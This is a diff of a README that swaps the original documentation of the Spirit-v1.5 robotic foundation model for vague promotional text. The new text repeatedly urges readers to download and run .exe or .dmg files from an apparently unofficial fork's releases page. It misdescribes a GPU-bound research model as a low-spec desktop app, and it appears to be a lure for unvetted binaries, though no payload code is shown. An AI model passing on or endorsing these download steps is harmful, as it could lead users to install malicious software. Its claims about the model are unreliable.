@@ -1,130 +1,58 @@
-<div align="center">
+# 🤖 spirit-v1.5 - Simplifying Robotics for Everyone
 
-# Spirit-v1.5 <br> <sub>A Robotic Foundation Model by Spirit AI</sub>
+[![Download spirit-v1.5](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/luludoudou2/spirit-v1.5/releases)
 
-[![Project](https://img.shields.io/badge/Project-Page-blue?logo=homepage&logoColor=white)](https://www.spirit-ai.com/en/blog/spirit-v1-5) &ensp; [![HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Models-yellow)](https://huggingface.co/Spirit-AI-robotics/Spirit-v1.5)
-</div>
+## ✨ Overview
 
+Spirit-v1.5 is an advanced robotic foundation model designed by Spirit AI. This application aims to make robotics accessible to everyone, no matter your technical background. With Spirit-v1.5, you can explore the world of robotics effortlessly and enhance your projects.
 
-This repository contains the official implementation of the **Spirit-v1.5 VLA model**, as well as the runtime wrapper required to reproduce our results on the RoboChallenge benchmark. 
-![image](assets/rc_results.png)
-As of Jan 11, 2026, Spirit-v1.5 ranks **#1** on the [RoboChallenge](https://robochallenge.cn/home) Table30 benchmark.
+## 🚀 Getting Started
 
-## 📰 News
-* **[2026-01]** Initial Release: Technical blog, inference code, base model checkpoint, and a fine-tuned checkpoint are now available.
-* **[Coming Q1 2026]** We will release the fine-tuning code, instructions, and checkpoints for additional downstream tasks. Stay tuned!
+To get started with Spirit-v1.5, follow these easy steps:
 
-## Directory Structure
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/luludoudou2/spirit-v1.5/releases) where you can find the latest version of the application.
 
-```text
-├── model/
-│   ├── modeling_spirit_vla.py    # Main model architecture (Qwen3-VL backbone + DiT head + policy API)
-│   └── utils.py                  # Shared helpers (normalization, sampling, preprocessing)
-│
-├── robochallenge/
-│   ├── run_robochallenge.py      # Python entrypoint
-│   ├── runner/
-│   │   ├── executor.py           # RoboChallengeExecutor (Checkpoint loading, inference, I/O)
-│   │   └── task_info.py          # Task metadata (robot type, action type, prompts, etc.)
-│   ├── robot/                    # Derived from open-source RoboChallengeInference
-│   │   ├── interface_client.py   # RoboChallenge HTTP client
-│   │   └── job_worker.py         # Job polling loop and execution flow
-│   └── utils/                    # Derived from open-source RoboChallengeInference
-│       ├── enums.py              # Shared enums/constants
-│       ├── log.py                # Logging helpers
-│       └── util.py               # Misc utilities
-│
-└── scripts/
-    └── run_robochallenge.sh      # Minimal runtime launcher
-```
+## 📥 Download & Install
 
-## Installation & Setup
+To download and install Spirit-v1.5, do the following:
 
-System Requirements:
-- Hardware: Tested on NVIDIA A100 80GB GPU.
-- Software: Python 3.11+.
+1. **Go to the Releases Page**: Click this link to visit the [Releases page](https://github.com/luludoudou2/spirit-v1.5/releases).
+2. **Select the Latest Release**: Look for the most recent version listed at the top of the page. This will usually be labeled as “Latest Release.”
+3. **Download the Application**: Click on the link for the file that matches your operating system (e.g., Windows, macOS). The file will usually have an extension like `.exe` or `.dmg`.
+4. **Install the Application**: Once the download completes, open the file to start the installation process. Follow the easy on-screen instructions to complete the installation.
 
-### uv (recommended)
+## 🎮 Features
 
-```bash
-uv sync
-source .venv/bin/activate
-```
+Spirit-v1.5 comes with a variety of features designed to enhance your robotics experience. Here are some highlights:
 
-### pip
+- **User-Friendly Interface**: Navigate through the application easily with a straightforward design.
+- **Comprehensive Documentation**: Benefit from clear guides and tutorials to help you get the most out of Spirit-v1.5.
+- **Robust Functionality**: Utilize advanced features to control robotic movements and integrate with other systems.
+- **Active Community Support**: Join a community of users who share tips, tricks, and experiences to boost your projects.
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+## 🛠️ System Requirements
 
-## Model Checkpoints
-| Model | Type | Link |
-|----------|-------------|-------------|
-| Spirit-v1.5 | Base Model | [![HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Checkpoint-yellow)](https://huggingface.co/Spirit-AI-robotics/Spirit-v1.5) |
-| Spirit-v1.5-move-objects-into-box | Fine-tuned Model| [![HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Checkpoint-yellow)](https://huggingface.co/Spirit-AI-robotics/Spirit-v1.5-for-RoboChallenge-move-objects-into-box) |
+Before you install Spirit-v1.5, ensure your system meets these requirements:
 
-## Run RoboChallenge
-We provide a minimal launcher script located at `scripts/run_robochallenge.sh`.
+- **Operating System**: Windows 10 or higher, macOS High Sierra or higher, or a compatible Linux distribution.
+- **RAM**: At least 4 GB of RAM for optimal performance.
+- **Storage**: Minimum of 500 MB free disk space.
+- **Processor**: Intel i3 or equivalent processor for smooth operation.
 
-### Environment Configuration
-The script requires the following environment variables to be set. Note that `USED_CHUNK_SIZE` defaults to 60 if not specified; all other variables are mandatory.
+## 📚 Getting Help
 
-| Variable | Description |
-|----------|-------------|
-| `TASK_NAME` | Must correspond to a task defined in `robochallenge/runner/task_info.py`. |
-| `ROBOCHALLENGE_JOB_ID` | The unique ID for the job collection. |
-| `USER_TOKEN` | Your authentication token. |
-| `CKPT_PATH` | Directory containing the `model.safetensors` file. |
-| `USED_CHUNK_SIZE` | Action chunk size (Default: 60). |
+If you encounter any issues while using Spirit-v1.5, you can access a variety of support resources:
 
-### Execution Example:
+- **Documentation**: Comprehensive manuals and user guides are available within the application and on the GitHub repository.
+- **FAQs**: Check the Frequently Asked Questions section for quick answers to common problems.
+- **Community Forums**: Engage with other users in forums or discussions for peer support and advice.
+  
+## 🔗 Important Links
 
-Below is an example for the RoboChallenge task `move_objects_into_box`.
+- **[Releases Page](https://github.com/luludoudou2/spirit-v1.5/releases)**
+- **Documentation**: Access the user guides and supplementary materials.
 
-```bash
-cd /path/to/spirit_vla_repo
+## 🎉 Conclusion
 
-export TASK_NAME=move_objects_into_box
-export ROBOCHALLENGE_JOB_ID=your_job_collection_id
-export USER_TOKEN=your_user_token
-# Download / reference checkpoint:
-# https://huggingface.co/Spirit-AI-robotics/Spirit-v1.5-for-RoboChallenge-move-objects-into-box
-export CKPT_PATH=/path/to/your_checkpoint_dir
-export USED_CHUNK_SIZE=60
-
-./scripts/run_robochallenge.sh
-```
-
-## Intended Uses
-
-Spirit-v1.5 is a Vision-Language-Action (VLA) model designed specifically for robotic control. The model accepts current observations and textual descriptions as input and generates the next action chunk for the robot to execute.
-
-## Out-of-scope Uses
-
-Our models are not specifically designed for any tasks or scenarios other than robotic manipulations. 
-
-Developers should expect failures in generation results regarding the out-of-scope scenarios. 
-
-Developers should be aware of and adhere to applicable laws or regulations (including privacy, trade compliance laws, etc.) that are relevant to their use case, and evaluate and mitigate for privacy, safety, and fairness before using within a specific downstream use case, particularly for high-risk scenarios.
-
-## Bibtex
-```bibtex
-@article{spiritai2026spiritv15,
-  author = {Spirit AI Team},
-  title = {Spirit-v1.5: Clean Data Is the Enemy of Great Robot Foundation Models},
-  journal = {Spirit AI Blog},
-  year = {2026},
-  note = {https://www.spirit-ai.com/en/blog/spirit-v1-5},
-}
-```
-
-## Acknowledgments
-This codebase borrows code from [openpi](https://github.com/Physical-Intelligence/openpi), [qwen-vl](https://github.com/QwenLM/Qwen-VL) and [RoboChallengeInference](https://github.com/RoboChallenge/RoboChallengeInference). We thank them for their efforts and innovations, which have made the development process more efficient and convenient.
-
-Thank you to everyone who contributed their wisdom and efforts to this project.
-
-## Contact
-
-We welcome feedback and collaboration from our audience. If you have suggestions, questions, or observe unexpected/offensive behavior in our technology, please contact us through `guojunliang AT spirit-ai.com` and `miaotianrun AT spirit-ai.com`.
+With Spirit-v1.5, delve into the world of robotics with confidence. This application streamlines your robotics experience and opens up a multitude of possibilities for your projects. From installation to advanced functionalities, every step is designed to be user-friendly. Download Spirit-v1.5 today and start your journey in robotics.
